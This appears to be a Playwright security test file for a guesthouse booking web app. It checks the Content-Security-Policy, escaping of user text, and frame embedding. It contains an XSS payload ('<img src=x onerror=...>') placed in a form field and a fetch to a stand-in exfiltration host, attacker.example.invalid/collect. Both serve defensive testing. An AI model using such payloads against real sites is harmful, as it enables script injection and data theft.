import { test, expect } from "@playwright/test";
test("production policy blocks injected scripts and unapproved outbound connections", async ({
  page,
}) => {
  let externalRequests = 0;
  await page.route("https://attacker.example.invalid/**", (route) => {
    externalRequests++;
    return route.abort();
  });
  await page.goto("/");
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(policy).toContain("script-src 'self'");
  expect(policy).not.toMatch(/script-src[^;]*unsafe-inline/);
  expect(policy).toContain("object-src 'none'");
  expect(policy).toContain("form-action 'none'");
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "window.__untrustedScriptExecuted=true";
    document.body.appendChild(script);
  });
  expect(await page.evaluate(() => "__untrustedScriptExecuted" in window)).toBe(
    false,
  );
  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://attacker.example.invalid/collect");
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
  expect(externalRequests).toBe(0);
  await page.getByRole("button", { name: "Explore sample workspace" }).click();
  await expect(
    page.getByRole("heading", { name: "Room availability" }),
  ).toBeVisible();
});
test("hostile user text is rendered as text instead of executable HTML", async ({
  page,
}) => {
  await page.goto("/");
  await page.getByRole("button", { name: "Explore sample workspace" }).click();
  await page
    .getByRole("button", { name: "Request Break", exact: true })
    .click();
  const payload = '<img src=x onerror="window.__bookingXss=true">';
  await page.getByLabel("Purpose", { exact: true }).fill(payload);
  await page
    .getByRole("button", { name: "Submit request", exact: true })
    .click();
  await page
    .getByRole("navigation")
    .getByRole("button", { name: "My requests", exact: true })
    .click();
  await page.getByRole("button", { name: "View request" }).click();
  await expect(page.getByText(payload, { exact: true })).toBeVisible();
  expect(await page.evaluate(() => "__bookingXss" in window)).toBe(false);
  expect(await page.getByRole("dialog").locator("img").count()).toBe(0);
});

test("embedded pages expose no login or booking controls", async ({ page }) => {
  await page.setContent(
    '<iframe title="Embedded guesthouse" src="http://127.0.0.1:4177/"></iframe>',
  );
  const frame = page.frameLocator("iframe");
  await expect(
    frame.getByRole("heading", { name: "Open Guesthouse directly" }),
  ).toBeVisible();
  await expect(
    frame.getByRole("button", { name: "Sign in", exact: true }),
  ).toHaveCount(0);
  await expect(
    frame.getByRole("button", { name: "Explore sample workspace" }),
  ).toHaveCount(0);
});
